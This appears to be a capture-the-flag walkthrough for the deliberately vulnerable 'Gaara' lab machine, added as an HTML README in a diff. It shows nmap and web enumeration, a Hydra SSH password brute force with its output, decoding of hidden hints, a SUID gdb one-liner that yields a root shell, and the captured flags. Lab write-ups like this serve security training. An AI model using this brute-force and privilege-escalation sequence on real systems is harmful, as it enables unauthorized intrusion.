@@ -1,0 +1,200 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body><br/>
+IP - 10.0.2.42<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Gaara]<br/>
+└─# nmap -sC -sV 10.0.2.42 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 21:49 +0630<br/>
+Nmap scan report for 10.0.2.42<br/>
+Host is up (0.00010s latency).<br/>
+Not shown: 65533 closed tcp ports (reset)<br/>
+PORT &nbsp; STATE SERVICE VERSION<br/>
+22/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 3ea36f6403331e76f8e498febee98e58 (RSA)<br/>
+| &nbsp; 256 6c0eb500e742444865effed77ce664d5 (ECDSA)<br/>
+|_ &nbsp;256 b751f2f9855766a865542e05f940d2f4 (ED25519)<br/>
+80/tcp open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.38 ((Debian))<br/>
+|_http-title: Gaara<br/>
+|_http-server-header: Apache/2.4.38 (Debian)<br/>
+MAC Address: 08:00:27:B6:0D:31 (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Enumerating Web Application<br/>
+<br/>
+After running gobuster, I found new directory call "Cryoserver". So, I go to that directory and found nothing first but I look at "inspect (F12)" and found 3 hidden directory called "/Temari", "/Kazekage" and "/iamGaara".<br/>
+<br/>
+So, I look at all of these 3 new directory and found a huge text in every page. So, I decided to compare them.<br/>
+<br/>
+All text from Temari page and Kazekage page are the same. I got this base58 hash from "iamGaara" page: (I tried every "base" algorithm from https://cyberchef.org/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)&amp;input=ZjFNZ045bVRmOVNOYnpSeWdjVQ found correct one.)<br/>
+<br/>
+f1MgN9mTf9SNbzRygcU<br/>
+<br/>
+decoded version - gaara:ismyname<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+User Access (ssh)<br/>
+<br/>
+I got ssh user access as gaara. I tried above gaara as username and password as ismyname but it didn't work so I tried bruteforce with hydra and using rockyou wordlist and got gaara real ssh password.<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# hydra -l gaara -P /usr/share/wordlists/rockyou.txt 10.0.2.42 ssh<br/>
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br/>
+<br/>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-27 22:22:50<br/>
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br/>
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br/>
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br/>
+[DATA] attacking ssh://10.0.2.42:22/<br/>
+[STATUS] 146.00 tries/min, 146 tries in 00:01h, 14344256 to do in 1637:29h, 13 active<br/>
+[22][ssh] host: 10.0.2.42 &nbsp; login: gaara &nbsp; password: iloveyou2<br/>
+1 of 1 target successfully completed, 1 valid password found<br/>
+<br/>
+username - gaara<br/>
+password - iloveyou2<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ssh gaara@10.0.2.42 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+gaara@10.0.2.42's password: <br/>
+Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64<br/>
+<br/>
+The programs included with the Debian GNU/Linux system are free software;<br/>
+the exact distribution terms for each program are described in the<br/>
+individual files in /usr/share/doc/*/copyright.<br/>
+<br/>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br/>
+permitted by applicable law.<br/>
+Last login: Sun Dec 13 17:00:37 2020 from 192.168.1.107<br/>
+gaara@Gaara:~$ whoami<br/>
+gaara<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I found juciy file name called Kazekage.txt and it contain base64 code:<br/>
+<br/>
+gaara@Gaara:~$ cat Kazekage.txt <br/>
+You can find Kazekage here....<br/>
+<br/>
+L3Vzci9sb2NhbC9nYW1lcw==<br/>
+<br/>
+decoded version:<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# echo "L3Vzci9sb2NhbC9nYW1lcw==" | base64 -d &nbsp; &nbsp;<br/>
+/usr/local/games<br/>
+<br/>
+<br/>
+at /usr/local/games found another juciy brainfuck code:<br/>
+<br/>
+gaara@Gaara:/usr/local/games$ cat .supersecret.txt <br/>
+<br/>
+Godaime Kazekage:<br/>
+<br/>
++++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;+.-- ---.&lt; +++++<br/>
++++[- &gt;---- ----&lt; ]&gt;--- -.&lt;++ +++++ ++[-&gt; +++++ ++++&lt; ]&gt;+++ +++++ .&lt;+++<br/>
+[-&gt;-- -&lt;]&gt;- .++++ ++.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-- --.&lt;+ +++++ +++[-<br/>
+&gt;++++ +++++ &lt;]&gt;+. &lt;+++[ -&gt;--- &lt;]&gt;-- --.-- --.&lt;+ ++[-&gt; +++&lt;] &gt;++.. &lt;+++[<br/>
+-&gt;+++ &lt;]&gt;++ ++.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-- ----- -.&lt;++ +++++ ++[-&gt;<br/>
++++++ ++++&lt; ]&gt;+++ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.+. +++++ .---. &lt;++++ ++++[ -&gt;---<br/>
+----- &lt;]&gt;-- ----- ----. &lt;++++ +++++ [-&gt;++ +++++ ++&lt;]&gt; +++++ +++.&lt; +++[-<br/>
+&gt;---&lt; ]&gt;-.+ +++++ .&lt;+++ +++++ +[-&gt;- ----- ---&lt;] &gt;---- .&lt;+++ +++++ [-&gt;++<br/>
++++++ +&lt;]&gt;+ ++.&lt;+ ++[-&gt; +++&lt;] &gt;+++. +++++ +.--- ----- -.--- ----- .&lt;+++<br/>
++++++ [-&gt;-- ----- -&lt;]&gt;- ---.&lt; +++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +++.+ ++.++<br/>
++++.&lt; +++[- &gt;---&lt; ]&gt;-.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- -.&lt;++ +++++ ++[-&gt;<br/>
++++++ ++++&lt; ]&gt;++. ----. --.-- ----- -.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ +.&lt;++ +[-&gt;-<br/>
+--&lt;]&gt; ---.+ .++++ +.--- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- .&lt;+++<br/>
++++++ +[-&gt;+ +++++ +++&lt;] &gt;+++. &lt;+++[ -&gt;--- &lt;]&gt;-- -.--- ----. &lt;++++ [-&gt;++<br/>
+++&lt;]&gt; +++.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ ++[-&gt; +++++ +++&lt;]<br/>
+&gt;++++ +.--- -.&lt;++ ++[-&gt; ++++&lt; ]&gt;++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.&lt; +++[- &gt;+++&lt;<br/>
+]&gt;+++ +.&lt;++ +++++ [-&gt;-- ----- &lt;]&gt;-- ----- --.&lt;+ ++++[ -&gt;--- --&lt;]&gt; -----<br/>
+-.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;+ ++++. +++++ ++.&lt;+<br/>
++++++ +++[- &gt;---- ----- &lt;]&gt;-- ----- -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ .&lt;+++<br/>
+++[-&gt; +++++ &lt;]&gt;.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. +.&lt;++ +[-&gt;+<br/>
+++&lt;]&gt; ++++. &lt;++++ +++++ [-&gt;-- ----- --&lt;]&gt; .&lt;<br/>
+<br/>
+Decoded version :<br/>
+<br/>
+Did you really think you could find something that easily? Try Harder!<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation (SUID /usr/bin/gdb)<br/>
+<br/>
+Got Privilege Escalation with /usr/bin/gdb SUID misconfigration:<br/>
+<br/>
+https://gtfobins.github.io/gtfobins/gdb/#suid<br/>
+<br/>
+<br/>
+gaara@Gaara:/tmp$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit<br/>
+GNU gdb (Debian 8.2.1-2+b3) 8.2.1<br/>
+Copyright (C) 2018 Free Software Foundation, Inc.<br/>
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br/>
+This is free software: you are free to change and redistribute it.<br/>
+There is NO WARRANTY, to the extent permitted by law.<br/>
+Type "show copying" and "show warranty" for details.<br/>
+This GDB was configured as "x86_64-linux-gnu".<br/>
+Type "show configuration" for configuration details.<br/>
+For bug reporting instructions, please see:<br/>
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.<br/>
+Find the GDB manual and other documentation resources online at:<br/>
+&nbsp; &nbsp; &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br/>
+<br/>
+For help, type "help".<br/>
+Type "apropos word" to search for commands related to "word".<br/>
+# whoami<br/>
+root<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Vulhub Flags<br/>
+<br/>
+gaara@Gaara:~$ cat flag.txt <br/>
+5451d3eb27acb16c652277d30945ab1e<br/>
+<br/>
+# cat root.txt<br/>
+<br/>
+<br/>
+&nbsp;██████╗ &nbsp;█████╗ &nbsp;█████╗ ██████╗ &nbsp;█████╗ <br/>
+██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗<br/>
+██║ &nbsp;███╗███████║███████║██████╔╝███████║<br/>
+██║ &nbsp; ██║██╔══██║██╔══██║██╔══██╗██╔══██║<br/>
+╚██████╔╝██║ &nbsp;██║██║ &nbsp;██║██║ &nbsp;██║██║ &nbsp;██║<br/>
+&nbsp;╚═════╝ ╚═╝ &nbsp;╚═╝╚═╝ &nbsp;╚═╝╚═╝ &nbsp;╚═╝╚═╝ &nbsp;╚═╝<br/>
+<br/>
+8a763d61f71db8e7aa237055de928d86<br/>
+<br/>
+Congrats You have Rooted Gaara.<br/>
+<br/>
+Give the feedback on Twitter if you Root this : @0xJin<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Offensive Security Playground Lab Flags<br/>
+<br/>
+<br/>
+gaara@Gaara:~$ cat local.txt <br/>
+a8976b16e7dfe99b23ba6153ad01f928<br/>
+<br/>
+# cat proof.txt<br/>
+ea3add7cdb2119a1f30f41bc2e96d372<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------</body></html>
